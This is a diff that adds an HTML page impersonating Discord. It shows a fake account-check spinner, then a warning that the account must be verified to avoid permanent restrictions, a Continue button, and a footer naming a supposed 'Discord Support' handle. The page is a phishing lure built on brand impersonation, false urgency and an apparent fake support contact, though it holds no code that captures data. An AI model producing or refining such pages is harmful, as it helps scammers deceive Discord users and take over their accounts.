@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Discord — Account Check</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+    margin: 0;
+    font-family: "gg sans", "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    /* Discord landing-style deep blue gradient */
+    background: radial-gradient(1200px 600px at 20% 0%, #2b2d8f 0%, rgba(43,45,143,0.0) 60%),
+                linear-gradient(180deg, #0b0f2a 0%, #1b1f6a 45%, #2a2fb0 100%);
+    min-height: 100vh;
+}
+
+/* Overlay */
+.overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(8,10,36,0.65);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 16px;
+}
+
+/* Modal */
+.modal {
+    /* Darker panel to match Discord landing contrast */
+    background: #0f122f;
+    width: 100%;
+    max-width: 420px;
+    padding: 32px;
+    border-radius: 12px;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.55);
+    text-align: center;
+    color: #e6e7ff;
+}
+
+/* Hidden */
+.hidden { display: none; }
+
+/* Header */
+.header {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 16px;
+}
+
+.header img {
+    width: 36px;
+    height: 36px;
+}
+
+h2 {
+    margin: 0 0 8px;
+    font-size: 20px;
+    font-weight: 700;
+    letter-spacing: 0.2px;
+    color: #ffffff;
+}
+
+p {
+    margin: 0 0 20px;
+    font-size: 14px;
+    line-height: 1.55;
+    color: #c7c9ff;
+}
+
+/* Loader */
+.spinner {
+    width: 32px;
+    height: 32px;
+    border: 3px solid #2b2f8f;
+    border-top-color: #7289da;
+    border-radius: 50%;
+    margin: 20px auto 0;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+/* Button */
+.action-btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    height: 48px;
+    background: linear-gradient(180deg, #7b8cff 0%, #5865f2 100%);
+    color: #ffffff;
+    text-decoration: none;
+    border-radius: 999px;
+    font-size: 14px;
+    font-weight: 600;
+    transition: transform 0.1s ease, box-shadow 0.15s ease, filter 0.15s ease;
+    box-shadow: 0 10px 24px rgba(88,101,242,0.45);
+}
+
+.action-btn:hover {
+    filter: brightness(1.05);
+    transform: translateY(-1px);
+    box-shadow: 0 14px 30px rgba(88,101,242,0.6);
+}
+
+.footer-note {
+    margin-top: 16px;
+    font-size: 12px;
+    color: #aab0ff;
+}
+
+@media (max-width: 480px) {
+    .modal { padding: 24px 20px; }
+    h2 { font-size: 18px; }
+}
+</style>
+</head>
+<body>
+
+<div class="overlay">
+
+    <!-- Loading Screen -->
+    <div class="modal" id="loadingModal">
+        <div class="header">
+            <img src="discord.jpeg" alt="Discord" />
+        </div>
+        <h2>Checking Discord Account</h2>
+        <p>Please wait while we review your discord account status.</p>
+        <div class="spinner"></div>
+    </div>
+
+    <!-- Main Prompt -->
+    <div class="modal hidden" id="mainModal">
+        <div class="header">
+            <img src="discord.jpeg" alt="Discord" />
+        </div>
+        <h2>Account Review Required</h2>
+        <p>
+            Your account requires verification to avoid posible Permanent Restrictions.
+            Please continue to review your account.
+        </p>
+
+        <a href="https:Discord.com" class="action-btn">Continue</a>
+
+        <div class="footer-note">
+            This process helps keep the Discord community safe. | Discord Support - techsupport_0000
+        </div>
+    </div>
+
+</div>
+
+<script>
+setTimeout(() => {
+    document.getElementById("loadingModal").classList.add("hidden");
+    document.getElementById("mainModal").classList.remove("hidden");
+}, 3000);
+</script>
+
+</body>
+</html>
